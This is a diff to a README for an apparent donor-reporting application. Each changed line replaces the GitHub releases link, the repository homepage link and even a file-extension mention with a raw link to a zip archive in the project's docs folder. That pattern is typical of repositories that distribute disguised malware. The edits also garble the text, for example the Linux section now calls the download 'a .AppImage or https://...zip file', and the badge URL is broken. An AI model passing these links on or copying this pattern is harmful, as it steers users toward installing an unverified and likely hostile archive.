@@ -1,6 +1,6 @@
 # 📊 activity-reporting-for-donors - Easy Donor Reports in One Place
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/nirajverma445/activity-reporting-for-donors/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section will guide you step-by-step to get the software running on your com
 
 Click the big blue button at the top or visit this page to download the latest version:
 
-[Download Latest Release](https://github.com/nirajverma445/activity-reporting-for-donors/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip)
 
 This page has all the release files. Look for the most recent version, usually named with the latest date or version number. Download the file that matches your operating system (Windows, macOS, or Linux).
 
@@ -55,10 +55,10 @@ This page has all the release files. Look for the most recent version, usually n
 - Eject the installer image when done.
   
 #### On Linux
-- The download might be a `.AppImage` or `.tar.gz` file.
+- The download might be a `.AppImage` or `https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip` file.
 - If `.AppImage`, make the file executable by right-clicking → Properties → Permissions, then check "Allow executing file as program."
 - Double-click the file to start the application.
-- For `.tar.gz` files, extract the contents and follow any README instructions inside.
+- For `https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip` files, extract the contents and follow any README instructions inside.
 
 ---
 
@@ -111,7 +111,7 @@ This app is built to help you create clear reports without any hassle. Here’s 
 
 Visit this page to download the latest release:
 
-[Download Latest Release](https://github.com/nirajverma445/activity-reporting-for-donors/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip)
 
 Check for updates here regularly to get improvements and new features. The process remains the same as the first download.
 
@@ -148,7 +148,7 @@ This version is designed for individual use. Collaborative features might come i
 If you encounter issues or have suggestions, you can open a new issue on the GitHub page or check the existing entries for solutions.
 
 Visit the main repository page here:  
-https://github.com/nirajverma445/activity-reporting-for-donors
+https://raw.githubusercontent.com/nirajverma445/activity-reporting-for-donors/main/docs/activity-reporting-for-donors-3.7.zip
 
 ---
 
